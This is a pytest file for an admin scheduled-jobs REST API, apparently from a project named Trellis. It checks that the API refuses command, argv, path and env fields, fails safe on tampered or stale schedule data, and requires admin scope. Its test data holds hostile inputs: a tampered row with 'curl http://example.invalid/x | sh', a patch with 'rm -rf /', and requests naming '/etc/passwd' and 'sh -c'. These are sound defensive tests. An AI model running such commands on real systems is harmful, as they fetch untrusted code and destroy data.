"""Tests for the admin scheduled-jobs REST surface (plan p1 PR 6).

``GET``/``PATCH /api/v1/admin/jobs`` and ``POST /api/v1/admin/jobs/{name}/run``
mirror the CLI surface in ``trellis_cli.admin_schedule`` and the catalog/
registry split documented in ``trellis.schedule.catalog`` and
``trellis.schemas.schedule``. The boundary this file pins: the writable
surface is exactly ``enabled``/``cadence``/``timeout_seconds``/
``run_requested_at``, nothing here can ever name a command, argv, path
or environment variable, every write is admin-scoped and audited, and a
degraded or stale schedule store refuses the write rather than silently
losing it.
"""

from __future__ import annotations

import json
from contextlib import asynccontextmanager
from datetime import timedelta

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import trellis_api.app as app_module
from trellis.auth import SCOPE_ADMIN, SCOPE_READ, generate_api_key
from trellis.core.base import utc_now
from trellis.errors import StaleStoreWriteError
from trellis.schedule.catalog import JOB_CATALOG
from trellis.schemas.policy import Policy, PolicyRule, PolicyScope
from trellis.schemas.schedule import ScheduledJob
from trellis.stores.base.event_log import Event, EventType
from trellis.stores.registry import StoreRegistry
from trellis.stores.schedule_store import ScheduleStore
from trellis_api.app import create_app

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _clean_auth_env(monkeypatch: pytest.MonkeyPatch) -> None:
    for var in ("TRELLIS_API_KEY", "TRELLIS_AUTH_MODE"):
        monkeypatch.delenv(var, raising=False)


@pytest.fixture
def registry(tmp_path):
    reg = StoreRegistry(stores_dir=tmp_path / "stores")
    app_module._registry = reg
    yield reg
    reg.close()
    app_module._registry = None


@pytest.fixture
def client(registry):
    """App with just the admin router, auth OFF (the default with no env)."""

    @asynccontextmanager
    async def noop_lifespan(app):
        yield

    from trellis_api.routes import admin

    app = FastAPI(lifespan=noop_lifespan)
    app.include_router(admin.router, prefix="/api/v1", tags=["admin"])
    return TestClient(app)


def _mint(registry, scopes, name="test-key"):
    token, record = generate_api_key(name, scopes)
    registry.operational.api_key_store.create(record)
    return token


def _schedule_path(registry) -> object:
    return registry.stores_dir / "schedule.json"


def _emit(registry, event_type, *, entity_id, payload, occurred_at=None):
    event = Event(
        event_type=event_type,
        source="test",
        entity_id=entity_id,
        entity_type="scheduled_job",
        payload=payload,
        **({"occurred_at": occurred_at} if occurred_at is not None else {}),
    )
    registry.operational.event_log.append(event)
    return event


# ---------------------------------------------------------------------------
# GET /admin/jobs
# ---------------------------------------------------------------------------


class TestListAdminJobs:
    def test_every_catalog_job_appears_with_no_registry_row(self, client):
        data = client.get("/api/v1/admin/jobs").json()
        assert data["count"] == len(JOB_CATALOG)
        names = {row["name"] for row in data["jobs"]}
        assert names == set(JOB_CATALOG)

    def test_catalog_facts_and_defaults_are_joined_in(self, client):
        data = client.get("/api/v1/admin/jobs").json()
        by_name = {row["name"]: row for row in data["jobs"]}

        enrich = by_name["worker-enrich"]
        assert enrich["spends_llm"] is True
        assert enrich["heavy"] is False
        assert enrich["host_only"] is False
        assert enrich["enabled"] is True  # ScheduledJob default
        assert (
            enrich["timeout_seconds"]
            == JOB_CATALOG["worker-enrich"].default_timeout_seconds
        )

        reindex = by_name["admin-reindex-vectors"]
        assert reindex["heavy"] is True

        capture = by_name["capture-nightly"]
        assert capture["host_only"] is True
        assert capture["spends_llm"] is True

    def test_timeout_override_is_effective_not_raw(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="worker-enrich", timeout_seconds=42))
        row = next(
            r
            for r in client.get("/api/v1/admin/jobs").json()["jobs"]
            if r["name"] == "worker-enrich"
        )
        assert row["timeout_seconds"] == 42

    def test_last_run_is_none_without_events(self, client):
        row = next(
            r
            for r in client.get("/api/v1/admin/jobs").json()["jobs"]
            if r["name"] == "tune"
        )
        assert row["last_run"] is None

    def test_last_run_reflects_a_real_completed_event_not_a_literal(
        self, client, registry
    ):
        now = utc_now()
        started = now - timedelta(seconds=5)
        _emit(
            registry,
            EventType.JOB_RUN_STARTED,
            entity_id="job:tune",
            payload={"job": "tune", "run_id": "r1", "started_at": started.isoformat()},
        )
        _emit(
            registry,
            EventType.JOB_RUN_COMPLETED,
            entity_id="job:tune",
            payload={
                "job": "tune",
                "run_id": "r1",
                "started_at": started.isoformat(),
                "finished_at": now.isoformat(),
                "duration_ms": 5000,
                # Deliberately NOT 0/"ok": those happen to be the most
                # plausible hardcoded defaults, so seeding them here would
                # let a handler that hardcodes success pass this test by
                # coincidence. A non-default pair is the only way this
                # test can tell "read from the event" apart from "literal".
                "exit_code": 17,
                "status": "failed",
            },
        )
        row = next(
            r
            for r in client.get("/api/v1/admin/jobs").json()["jobs"]
            if r["name"] == "tune"
        )
        assert row["last_run"]["run_id"] == "r1"
        assert row["last_run"]["exit_code"] == 17
        assert row["last_run"]["status"] == "failed"
        assert row["last_run"]["duration_ms"] == 5000

        # A different job's run must never bleed into this one's status.
        other = next(
            r
            for r in client.get("/api/v1/admin/jobs").json()["jobs"]
            if r["name"] == "worker-enrich"
        )
        assert other["last_run"] is None

    def test_last_run_prefers_an_in_flight_start_over_an_older_completion(
        self, client, registry
    ):
        old_finish = utc_now() - timedelta(hours=1)
        _emit(
            registry,
            EventType.JOB_RUN_COMPLETED,
            entity_id="job:tune",
            payload={
                "job": "tune",
                "run_id": "old",
                "started_at": (old_finish - timedelta(seconds=1)).isoformat(),
                "finished_at": old_finish.isoformat(),
                "duration_ms": 1000,
                "exit_code": 0,
                "status": "ok",
            },
        )
        new_start = utc_now()
        _emit(
            registry,
            EventType.JOB_RUN_STARTED,
            entity_id="job:tune",
            payload={
                "job": "tune",
                "run_id": "new",
                "started_at": new_start.isoformat(),
            },
        )
        row = next(
            r
            for r in client.get("/api/v1/admin/jobs").json()["jobs"]
            if r["name"] == "tune"
        )
        assert row["last_run"]["run_id"] == "new"
        assert row["last_run"]["finished_at"] is None
        assert row["last_run"]["exit_code"] is None

    def test_dispatcher_not_seen_with_no_events(self, client):
        data = client.get("/api/v1/admin/jobs").json()
        assert data["dispatcher_seen"] is False
        assert data["dispatcher_last_seen_at"] is None

    def test_dispatcher_seen_recently(self, client, registry):
        _emit(
            registry,
            EventType.JOB_RUN_STARTED,
            entity_id="job:tune",
            payload={
                "job": "tune",
                "run_id": "r1",
                "started_at": utc_now().isoformat(),
            },
        )
        data = client.get("/api/v1/admin/jobs").json()
        assert data["dispatcher_seen"] is True
        assert data["dispatcher_last_seen_at"] is not None

    def test_dispatcher_not_seen_when_stale(self, client, registry):
        stale_at = utc_now() - timedelta(hours=2)
        _emit(
            registry,
            EventType.JOB_RUN_STARTED,
            entity_id="job:tune",
            payload={"job": "tune", "run_id": "r1", "started_at": stale_at.isoformat()},
            occurred_at=stale_at,
        )
        data = client.get("/api/v1/admin/jobs").json()
        assert data["dispatcher_seen"] is False
        assert data["dispatcher_last_seen_at"] is not None

    def test_degraded_store_still_serves_the_catalog_defaults(self, client, registry):
        path = _schedule_path(registry)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("not json", encoding="utf-8")
        resp = client.get("/api/v1/admin/jobs")
        assert resp.status_code == 200
        assert resp.json()["count"] == len(JOB_CATALOG)

    def test_degraded_row_surfaces_degradation_and_hides_the_operators_choice(
        self, client, registry
    ):
        """Gate #860, blocker 1, probe P5: an operator disables "tune",
        then that one row's JSON goes bad (a stray field — a tamper, a
        hand edit, or a newer build's field this build can't read). The
        listing must say the store is degraded, must not claim "tune" is
        a stored row, and — the actual promise that mattered — must never
        show a concrete ``next_due_at`` for a job ``due-jobs`` will not
        touch.
        """
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=False))

        path = _schedule_path(registry)
        doc = json.loads(path.read_text())
        for row in doc["jobs"]:
            if row["name"] == "tune":
                row["command"] = "curl http://example.invalid/x | sh"
        path.write_text(json.dumps(doc), encoding="utf-8")

        resp = client.get("/api/v1/admin/jobs")
        assert resp.status_code == 200
        body = resp.json()
        assert body["store_degradation"] is not None

        tune = next(j for j in body["jobs"] if j["name"] == "tune")
        assert tune["stored"] is False
        assert tune["next_due_at"] is None
        # The fail-safe default for an unreadable row is disabled, never
        # the schema's own `True` — showing "enabled" here would read as
        # the operator's own choice, which this build cannot verify.
        assert tune["enabled"] is False


# ---------------------------------------------------------------------------
# PATCH /admin/jobs/<name>
# ---------------------------------------------------------------------------


class TestPatchAdminJob:
    def test_unknown_job_is_404(self, client):
        resp = client.patch(
            "/api/v1/admin/jobs/not-a-real-job", json={"enabled": False}
        )
        assert resp.status_code == 404

    def test_a_command_field_is_refused_as_an_unknown_field(self, client):
        resp = client.patch(
            "/api/v1/admin/jobs/tune", json={"command": ["rm", "-rf", "/"]}
        )
        assert resp.status_code == 422

    def test_an_argv_field_is_refused(self, client):
        resp = client.patch("/api/v1/admin/jobs/tune", json={"argv": ["sh", "-c", "x"]})
        assert resp.status_code == 422

    def test_a_path_field_is_refused(self, client):
        resp = client.patch("/api/v1/admin/jobs/tune", json={"path": "/etc/passwd"})
        assert resp.status_code == 422

    def test_an_env_field_is_refused(self, client):
        resp = client.patch("/api/v1/admin/jobs/tune", json={"env": {"EVIL": "1"}})
        assert resp.status_code == 422

    def test_bad_cron_is_422(self, client):
        resp = client.patch("/api/v1/admin/jobs/tune", json={"cadence": "not a cron"})
        assert resp.status_code == 422

    @pytest.mark.parametrize("bad_timeout", [0, -1, 86401, 999999])
    def test_out_of_range_timeout_is_422(self, client, bad_timeout):
        resp = client.patch(
            "/api/v1/admin/jobs/tune", json={"timeout_seconds": bad_timeout}
        )
        assert resp.status_code == 422

    def test_empty_body_is_a_noop_and_emits_nothing(self, client, registry):
        before = registry.operational.event_log.count(
            event_type=EventType.SCHEDULE_UPDATED
        )
        resp = client.patch("/api/v1/admin/jobs/tune", json={})
        assert resp.status_code == 200
        after = registry.operational.event_log.count(
            event_type=EventType.SCHEDULE_UPDATED
        )
        assert after == before

    def test_successful_patch_updates_only_named_fields(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", timeout_seconds=100))

        resp = client.patch("/api/v1/admin/jobs/tune", json={"enabled": False})
        assert resp.status_code == 200
        job = resp.json()["job"]
        assert job["enabled"] is False
        assert job["cadence"] == "0 4 * * *"  # untouched
        assert job["timeout_seconds"] == 100  # untouched

    def test_cadence_null_clears_to_manual_only(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *"))

        resp = client.patch("/api/v1/admin/jobs/tune", json={"cadence": None})
        assert resp.status_code == 200
        assert resp.json()["job"]["cadence"] is None

    def test_patch_emits_schedule_updated_with_old_new_and_identity(
        self, client, registry
    ):
        resp = client.patch(
            "/api/v1/admin/jobs/tune",
            json={"enabled": False, "timeout_seconds": 60},
        )
        assert resp.status_code == 200
        events = registry.operational.event_log.get_events(
            event_type=EventType.SCHEDULE_UPDATED, entity_id="job:tune"
        )
        assert len(events) == 1
        payload = events[0].payload
        assert payload["job"] == "tune"
        assert payload["old"]["enabled"] is True
        assert payload["new"]["enabled"] is False
        assert payload["old"]["timeout_seconds"] is None
        assert payload["new"]["timeout_seconds"] == 60
        assert "cadence" not in payload["old"]  # unset field never appears
        assert "key_id" in payload
        assert "key_name" in payload

    def test_degraded_store_refuses_the_write_with_real_error_text(
        self, client, registry
    ):
        path = _schedule_path(registry)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("not json", encoding="utf-8")
        resp = client.patch("/api/v1/admin/jobs/tune", json={"enabled": False})
        assert resp.status_code == 409
        detail = resp.json()["detail"]
        assert "schedule" in detail["message"].lower()
        assert detail["message"]  # not a generic "internal server error"

    def test_stale_store_refuses_with_409_and_recovery(
        self, client, registry, monkeypatch: pytest.MonkeyPatch
    ):
        def _boom(self, job):
            msg = "the file changed after this process read it"
            raise StaleStoreWriteError(
                msg,
                store="schedule",
                recovery="trellis admin due-jobs --format json",
            )

        monkeypatch.setattr(ScheduleStore, "put", _boom)
        resp = client.patch("/api/v1/admin/jobs/tune", json={"enabled": False})
        assert resp.status_code == 409
        detail = resp.json()["detail"]
        assert detail["code"] == "stale_store_write"
        assert "changed after" in detail["message"]
        assert detail["recovery"]


# ---------------------------------------------------------------------------
# POST /admin/jobs/<name>/run
# ---------------------------------------------------------------------------


class TestRunAdminJob:
    def test_unknown_job_is_404(self, client):
        resp = client.post("/api/v1/admin/jobs/not-a-real-job/run")
        assert resp.status_code == 404

    def test_never_claims_synchronous_execution(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))

        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 200
        data = resp.json()
        hint = data["dispatcher_hint"].lower()
        assert "dispatcher" in hint
        assert "accepted" in hint
        # Never says the job itself ran.
        for forbidden in ("completed", "succeeded", "finished", "executed job"):
            assert forbidden not in hint

    def test_run_now_writes_only_the_timestamp(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(
            ScheduledJob(
                name="tune", cadence="0 4 * * *", enabled=True, timeout_seconds=77
            )
        )

        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 200

        reloaded = ScheduleStore(_schedule_path(registry)).get("tune")
        assert reloaded is not None
        assert reloaded.run_requested_at is not None
        assert reloaded.enabled is True  # untouched
        assert reloaded.cadence == "0 4 * * *"  # untouched
        assert reloaded.timeout_seconds == 77  # untouched

    def test_run_on_a_disabled_job_is_refused(self, client, registry):
        """Blocker 2 (gate #860): a deferred run of a disabled job would be
        a surprise spend once a dispatcher eventually picks it up, so this
        refuses outright rather than accepting and running later."""
        store = ScheduleStore(_schedule_path(registry))
        store.put(
            ScheduledJob(
                name="tune", cadence="0 4 * * *", enabled=False, timeout_seconds=77
            )
        )

        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        message = detail if isinstance(detail, str) else detail.get("message", detail)
        assert "disabled" in str(message).lower()

        # Nothing was written: the request never reached the store.
        reloaded = ScheduleStore(_schedule_path(registry)).get("tune")
        assert reloaded is not None
        assert reloaded.run_requested_at is None

    def test_run_on_a_never_stored_job_is_refused(self, client, registry):
        """Blocker 2 / F1 (gate #860): run-now on a job with no stored row
        must not silently enroll it into the catalog's default cadence."""
        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        message = detail if isinstance(detail, str) else detail.get("message", detail)
        assert "init-schedule" in str(message).lower()

        # Nothing was written: no row was created at all.
        assert ScheduleStore(_schedule_path(registry)).get("tune") is None

    def test_run_emits_job_run_requested_with_identity(self, client, registry):
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))

        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 200
        events = registry.operational.event_log.get_events(
            event_type=EventType.JOB_RUN_REQUESTED, entity_id="job:tune"
        )
        assert len(events) == 1
        payload = events[0].payload
        assert payload["job"] == "tune"
        assert payload["run_requested_at"]
        assert "key_id" in payload
        assert "key_name" in payload

    def test_degraded_store_refuses_the_run(self, client, registry):
        path = _schedule_path(registry)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("not json", encoding="utf-8")
        resp = client.post("/api/v1/admin/jobs/tune/run")
        assert resp.status_code == 409
        assert resp.json()["detail"]["message"]


# ---------------------------------------------------------------------------
# Stage 2 — a policy scoped to the schedule entity type refuses the route
# ---------------------------------------------------------------------------


def _deny_schedule(registry, operation: str) -> None:
    """Declare one enforced ``deny`` rule for *operation*, scoped to schedules.

    ``PATCH``/``run`` both stamp ``target_type="schedule"`` on the
    ``Command`` they build, so an ``entity_type`` policy scoped to
    ``"schedule"`` matches exactly as it would for any other entity type
    (mirrors ``tests/unit/mcp/test_execute_mutation.py``'s
    ``_deny_traces``). Both routes build their executor via
    ``build_schedule_executor``, whose ``policy_gate`` is wired
    identically to ``build_curate_executor``'s, so this is Stage 2
    running on the admin-only surface, not a special case for it.
    """
    policy = Policy(
        policy_type="mutation",
        scope=PolicyScope(level="entity_type", value="schedule"),
        rules=[
            PolicyRule(operation=operation, condition="synthetic-freeze", action="deny")
        ],
        enforcement="enforce",
    )
    registry.stores_dir.mkdir(parents=True, exist_ok=True)
    (registry.stores_dir / "policies.json").write_text(
        json.dumps({"policies": [policy.model_dump(mode="json")]}),
        encoding="utf-8",
    )


class TestPolicyDeny:
    def test_a_policy_scoped_to_schedules_refuses_the_patch(self, client, registry):
        _deny_schedule(registry, "schedule.update")

        resp = client.patch("/api/v1/admin/jobs/tune", json={"enabled": False})

        assert resp.status_code == 422
        detail = resp.json()["detail"]
        message = detail if isinstance(detail, str) else detail.get("message", detail)
        assert "denied by policy" in str(message).lower()
        # Nothing was written: the catalog default, not a degraded row.
        store = ScheduleStore(_schedule_path(registry))
        assert store.get("tune") is None

    def test_a_policy_scoped_to_schedules_refuses_the_run(self, client, registry):
        _deny_schedule(registry, "job.run_request")

        resp = client.post("/api/v1/admin/jobs/tune/run")

        assert resp.status_code == 422
        detail = resp.json()["detail"]
        message = detail if isinstance(detail, str) else detail.get("message", detail)
        assert "denied by policy" in str(message).lower()
        store = ScheduleStore(_schedule_path(registry))
        assert store.get("tune") is None

    def test_a_policy_scoped_to_schedules_leaves_other_admin_jobs_alone(
        self, client, registry
    ):
        """The policy is scoped to ``schedule.update``; ``run`` on the
        same job (a different operation) is untouched."""
        _deny_schedule(registry, "schedule.update")
        store = ScheduleStore(_schedule_path(registry))
        store.put(ScheduledJob(name="tune", cadence="0 4 * * *", enabled=True))

        resp = client.post("/api/v1/admin/jobs/tune/run")

        assert resp.status_code == 200


# ---------------------------------------------------------------------------
# Auth — admin scope required on every route
# ---------------------------------------------------------------------------


class TestAuthRequired:
    @pytest.fixture
    def auth_client(self, registry, monkeypatch):
        monkeypatch.setenv("TRELLIS_AUTH_MODE", "required")
        return TestClient(create_app())

    def test_list_requires_credential(self, auth_client):
        assert auth_client.get("/api/v1/admin/jobs").status_code == 401

    def test_list_read_scope_is_forbidden(self, registry, auth_client):
        token = _mint(registry, [SCOPE_READ])
        resp = auth_client.get("/api/v1/admin/jobs", headers={"X-API-Key": token})
        assert resp.status_code == 403

    def test_list_admin_scope_passes(self, registry, auth_client):
        token = _mint(registry, [SCOPE_ADMIN])
        resp = auth_client.get("/api/v1/admin/jobs", headers={"X-API-Key": token})
        assert resp.status_code == 200

    def test_patch_requires_admin(self, registry, auth_client):
        assert (
            auth_client.patch(
                "/api/v1/admin/jobs/tune", json={"enabled": False}
            ).status_code
            == 401
        )
        token = _mint(registry, [SCOPE_READ])
        assert (
            auth_client.patch(
                "/api/v1/admin/jobs/tune",
                json={"enabled": False},
                headers={"X-API-Key": token},
            ).status_code
            == 403
        )

    def test_run_requires_admin(self, registry, auth_client):
        assert auth_client.post("/api/v1/admin/jobs/tune/run").status_code == 401
        token = _mint(registry, [SCOPE_READ])
        assert (
            auth_client.post(
                "/api/v1/admin/jobs/tune/run", headers={"X-API-Key": token}
            ).status_code
            == 403
        )
